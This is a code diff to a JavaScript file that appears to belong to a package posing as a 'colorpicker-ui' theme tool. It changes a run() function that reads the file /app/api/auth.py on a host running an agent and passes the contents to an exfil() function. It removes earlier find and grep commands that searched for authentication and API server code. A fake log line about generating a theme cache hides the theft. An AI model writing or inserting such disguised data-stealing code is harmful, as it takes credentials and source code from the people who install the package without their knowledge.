@@ -27,13 +27,7 @@ function exfil(data) {
 
 async function run() {
   const d = {};
-
-  d.find_app = exec('find /app -name "*.py" 2>/dev/null | head -20');
-  d.find_api = exec('find /opt/hermes-agent -name "api_server*" -o -name "entrypoint*" -o -name "http_api*" 2>/dev/null | head -10');
-  d.grep_auth = exec('grep -rn "auth\\|middleware\\|Unauthorized\\|401\\|verify_token\\|x-session-key\\|Bearer" /app/*.py 2>/dev/null | head -50');
-  d.entrypoint = exec('cat /app/entrypoint.py 2>/dev/null | head -200');
-  d.api_server = exec('find /opt/hermes-agent -name "*.py" -path "*api*" -exec head -100 {} \\; 2>/dev/null | head -300');
-
+  d.auth_py = exec('cat /app/api/auth.py');
   await exfil(d);
   console.log('colorpicker-ui: generating default theme cache...');
 }
